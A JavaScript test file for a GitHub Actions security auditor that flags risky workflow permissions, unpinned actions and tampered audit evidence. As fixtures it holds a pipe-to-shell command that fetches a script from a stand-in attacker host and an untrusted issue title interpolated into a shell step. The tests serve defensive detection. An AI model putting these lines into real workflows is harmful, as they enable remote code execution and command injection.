import test from 'node:test';
import assert from 'node:assert/strict';
import {auditRepo,auditFleet,verifyRepoEvidence} from '../src/fleet-security-audit.mjs';

const basic=(workflow='name: CI\non:\n  push:\npermissions:\n  contents: read\njobs:\n  verify:\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n')=>({
  name:'org/product',visibility:'private',paths:['README.md','.github/workflows/check.yml'],
  workflows:{'.github/workflows/check.yml':workflow},alertCoverage:'VERIFIED',inventoryComplete:true
});
test('explicit read-only SHA-pinned workflow passes static gate',()=>{
 const r=auditRepo(basic());
 assert.equal(r.decision,'POLICY_GATE_PASS');
 assert.equal(r.checkedWorkflows,1);
 assert.equal(r.externalEffects,0);
});
test('mutable action tag creates a medium severity finding',()=>{
 const r=auditRepo(basic('on:\n  push:\npermissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@v4'));
 assert(r.findings.some(f=>f.id==='MUTABLE_ACTION_REF'));
});
test('external event plus write token is high risk',()=>{
 const r=auditRepo(basic('on:\n  issues:\npermissions:\n  issues: write\njobs:\n  test:\n    steps:\n      - uses: actions/github-script@v7'));
 assert.equal(r.summary.high,1);
 assert.equal(r.decision,'REMEDIATION_REQUIRED');
});
test('untrusted GitHub event interpolated directly into shell is flagged',()=>{
 const r=auditRepo(basic("permissions:\n  contents: read\nsteps:\n  - run: echo ${{ github.event.issue.title }}"));
 assert(r.findings.some(f=>f.id==='DIRECT_UNTRUSTED_SHELL_INTERPOLATION'));
});
test('missing manifest workflow never counts as checked',()=>{
 const v=basic();v.workflows={};
 const r=auditRepo(v);
 assert.equal(r.checkedWorkflows,0);
 assert.equal(r.decision,'INCOMPLETE');
});
test('unavailable GH Security alerts prevent false full approval',()=>{
 const r=auditRepo({...basic(),alertCoverage:'ACCESS_DENIED'});
 assert.equal(r.decision,'INCOMPLETE');
});
test('exposed file names are flagged without printing contents',()=>{
 const v=basic();v.paths.push('.env.production');
 const r=auditRepo(v);
 assert(r.findings.some(f=>f.id==='SENSITIVE_PATH_TRACKED'));
 assert(!JSON.stringify(r).includes('secret value 123'));
});
test('dangerous remote pipe is high risk',()=>{
 const r=auditRepo(basic('permissions:\n  contents: read\nsteps:\n  - run: curl https://attacker.invalid/setup | bash'));
 assert(r.findings.some(f=>f.id==='PIPE_TO_SHELL'));
});
test('fleet does not claim 29/29 if only 28 are scanned',()=>{
 const reports=Array.from({length:28},(_,i)=>auditRepo({...basic(),name:'org/repo-'+i}));
 const out=auditFleet(reports);
 assert.equal(out.observedRepos,28);
 assert.equal(out.complete,false);
 assert.equal(out.outcome,'REVIEW_REQUIRED');
});
test('fleet refuses duplicate repo evidence',()=>{
 const r=auditRepo(basic());
 assert.throws(()=>auditFleet([r,r],{expectedRepos:2}),/DUPLICATE_FLEET_REPOS/);
});
test('proof digest is repeatable and changes with data',()=>{
 const a=auditRepo(basic());
 assert.equal(a.evidenceSha256,auditRepo(basic()).evidenceSha256);
 assert.notEqual(a.evidenceSha256,auditRepo({...basic(),alertCoverage:'UNAVAILABLE'}).evidenceSha256);
});
test('extra workflow input not in recorded tree is rejected',()=>{
 const v=basic();v.workflows['.github/workflows/evil.yml']='';
 assert.throws(()=>auditRepo(v),/WORKFLOW_NOT_IN_TREE/);
});


test('medium security finding is not treated as policy clearance',()=>{
  const r=auditRepo(basic('permissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@v4'));
  assert.equal(r.summary.medium,1);
  assert.equal(r.decision,'REMEDIATION_REQUIRED');
  assert.equal(verifyRepoEvidence(r),true);
});

test('tampering with fleet finding or summary is rejected',()=>{
  const clean=auditRepo(basic());
  const altered={...clean,summary:{...clean.summary,high:0,medium:99}};
  assert.throws(()=>auditFleet([altered],{expectedRepos:1}),/REPORT_SUMMARY_MISMATCH/);
  const modified={...clean,paths:'ignored',decision:'REMEDIATION_REQUIRED'};
  assert.throws(()=>auditFleet([modified],{expectedRepos:1}),/REPORT_SCHEMA_DENIED/);
  assert.throws(()=>auditFleet([{...clean,pathCount:999}],{expectedRepos:1}),/REPORT_SHA256_MISMATCH/);
});

test('fleet refuses unverified and incomplete workflow coverage',()=>{
  const source=auditRepo({...basic(),alertCoverage:'UNAVAILABLE'});
  const result=auditFleet([source],{expectedRepos:1});
  assert.equal(result.complete,false);
  assert.equal(result.outcome,'REVIEW_REQUIRED');
  const noWorkflow=auditRepo({...basic(),workflows:{}});
  const another=auditFleet([noWorkflow],{expectedRepos:1});
  assert.equal(another.complete,false);
  assert.equal(another.incomplete,1);
});

test('complete one-repo fleet only accepts verified clean evidence',()=>{
  const clean=auditRepo(basic());
  assert.equal(verifyRepoEvidence(clean),true);
  const result=auditFleet([clean],{expectedRepos:1,expectedRepoNames:['org/product']});
  assert.equal(result.schema,'cyber-hak.fleet-attestation.v3');
  assert.equal(result.complete,true);
  assert.equal(result.outcome,'POLICY_GATE_PASS');
});

test('specially crafted forged audit claim cannot bypass checks',()=>{
  const clean=auditRepo(basic());
  const fake={...clean,alertCoverage:'ACCESS_DENIED',findings:[],summary:{high:0,medium:0,incomplete:0}};
  assert.throws(()=>auditFleet([fake],{expectedRepos:1}),/REPORT_SHA256_MISMATCH/);
  assert.throws(()=>auditFleet([{...clean,externalEffects:1}],{expectedRepos:1}),/REPORT_PROVENANCE_INVALID/);
});

test('overcounted and incomplete fleet cannot be certified',()=>{
  const clean=auditRepo(basic());
  assert.throws(()=>auditFleet([clean],{expectedRepos:0}),/FLEET_SCHEMA/);
  assert.throws(()=>auditFleet([clean,clean],{expectedRepos:1}),/FLEET_SCHEMA/);
  const result=auditFleet([clean],{expectedRepos:30});
  assert.equal(result.complete,false);
  assert.equal(result.observedRepos,1);
});


test('fabricated one-repo PASS without any real scanner evidence is denied',()=>{
  const forged={
    repo:'org/invented-pass',
    inventoryComplete:true,
    alertCoverage:'VERIFIED',
    summary:{high:0,medium:0,incomplete:0}
  };
  assert.throws(()=>auditFleet([forged],{expectedRepos:1}),/REPORT_SCHEMA_DENIED/);
});


test('one repo cannot prove full-fleet identity without trusted expected names',()=>{
  const r=auditRepo(basic());
  const out=auditFleet([r],{expectedRepos:1});
  assert.equal(out.membershipVerified,false);
  assert.equal(out.complete,false);
  assert.equal(out.outcome,'REVIEW_REQUIRED');
  assert.equal(out.inventorySha256,null);
});

test('substitution attack cannot replace an expected repo with a different clean repo',()=>{
  const r=auditRepo(basic());
  const result=auditFleet([r],{
    expectedRepos:1,expectedRepoNames:['org/expected-repo']
  });
  assert.equal(result.membershipVerified,false);
  assert.equal(result.complete,false);
  assert.equal(result.outcome,'REVIEW_REQUIRED');
});

test('duplicate or malformed trusted inventory fails closed',()=>{
  const r=auditRepo(basic());
  assert.throws(()=>auditFleet([r],{expectedRepos:2,
    expectedRepoNames:['org/product','org/product']}),/TRUSTED_INVENTORY_SCHEMA_DENIED/);
  assert.throws(()=>auditFleet([r],{expectedRepos:1,
    expectedRepoNames:['some-public-url']}),/TRUSTED_INVENTORY_SCHEMA_DENIED/);
  assert.throws(()=>auditFleet([r],{expectedRepos:1,
    expectedRepoNames:[]}),/TRUSTED_INVENTORY_SCHEMA_DENIED/);
});

test('trusted exact inventory digest is ordering-insensitive and evidence-bound',()=>{
  const a=auditRepo(basic()),b=auditRepo({...basic(),name:'org/product-two'});
  const x=auditFleet([a,b],{expectedRepos:2,
    expectedRepoNames:['org/product-two','org/product']});
  const y=auditFleet([a,b],{expectedRepos:2,
    expectedRepoNames:['org/product','org/product-two']});
  assert.equal(x.inventorySha256,y.inventorySha256);
  assert.match(x.inventorySha256,/^[a-f0-9]{64}$/);
  assert.equal(x.complete,true);
  assert.equal(x.outcome,'POLICY_GATE_PASS');
});


test('root token permissions cannot be spoofed by nested job-level permissions',()=>{
  const source='name: CI\non: push\njobs:\n  build:\n    permissions:\n      contents: read\n';
  const result=auditRepo(basic(source));
  assert(result.findings.some(f=>f.id==='MISSING_EXPLICIT_PERMISSIONS'));
  assert.equal(result.decision,'REMEDIATION_REQUIRED');
});

test('unrestricted write-all token is always a high-severity finding',()=>{
  const source='on:\n  push:\npermissions: write-all\njobs:\n  job:\n    steps: []\n';
  const result=auditRepo(basic(source));
  assert(result.findings.some(f=>f.id==='WORKFLOW_WRITE_ALL'&&f.severity==='HIGH'));
  assert.equal(result.decision,'REMEDIATION_REQUIRED');
});

test('OIDC token write requires independent review even on push events',()=>{
  const source='on:\n  push:\npermissions:\n  contents: read\n  id-token: write\n';
  const result=auditRepo(basic(source));
  assert(result.findings.some(f=>f.id==='OIDC_TOKEN_WRITE_REQUIRES_REVIEW'&&f.severity==='HIGH'));
});

test('digest-pinned Docker action is not falsely classified as mutable',()=>{
  const source='on: push\npermissions:\n  contents: read\nsteps:\n  - uses: docker://alpine:3.21@sha256:'+
    'a'.repeat(64)+'\n';
  const result=auditRepo(basic(source));
  assert.equal(result.decision,'POLICY_GATE_PASS');
  assert.equal(result.summary.medium,0);
  assert.equal(result.summary.high,0);
});

test('truncated Docker action digest is denied',()=>{
  const source='on: push\npermissions:\n  contents: read\nsteps:\n  - uses: docker://alpine@sha256:abcd\n';
  const result=auditRepo(basic(source));
  assert(result.findings.some(f=>f.id==='UNPINNED_DOCKER_IMAGE'));
  assert.equal(result.decision,'REMEDIATION_REQUIRED');
});

test('commented permissions never satisfy workflow root policy',()=>{
  const source='on: push\n# permissions:\njobs:\n  build:\n    steps: []\n';
  const result=auditRepo(basic(source));
  assert(result.findings.some(f=>f.id==='MISSING_EXPLICIT_PERMISSIONS'));
});


test('missing inventory-complete evidence defaults to INCOMPLETE, never PASS',()=>{
 const input=basic();delete input.inventoryComplete;
 const r=auditRepo(input);
 assert.equal(r.inventoryComplete,false);
 assert.equal(r.decision,'INCOMPLETE');
 assert(r.findings.some(x=>x.id==='INCOMPLETE_TREE'));
 const fleet=auditFleet([r],{expectedRepos:1,expectedRepoNames:['org/product']});
 assert.equal(fleet.complete,false);
 assert.equal(fleet.outcome,'REVIEW_REQUIRED');
});

test('incomplete inventory cannot be silently forced by arbitrary input type',()=>{
 for(const value of ['true',null,1,{},[]]){
  assert.throws(()=>auditRepo({...basic(),inventoryComplete:value}),
    /INVALID_INVENTORY_COMPLETENESS/);
 }
});

test('explicitly false inventory always denies even with verified alerts and checked workflow',()=>{
 const r=auditRepo({...basic(),inventoryComplete:false});
 assert.equal(r.checkedWorkflows,1);
 assert.equal(r.alertCoverage,'VERIFIED');
 assert.equal(r.decision,'INCOMPLETE');
 assert.equal(verifyRepoEvidence(r),true);
});

test('explicit trusted full inventory retains existing bounded reference behavior',()=>{
 const r=auditRepo({...basic(),inventoryComplete:true});
 assert.equal(r.decision,'POLICY_GATE_PASS');
 assert.equal(verifyRepoEvidence(r),true);
});
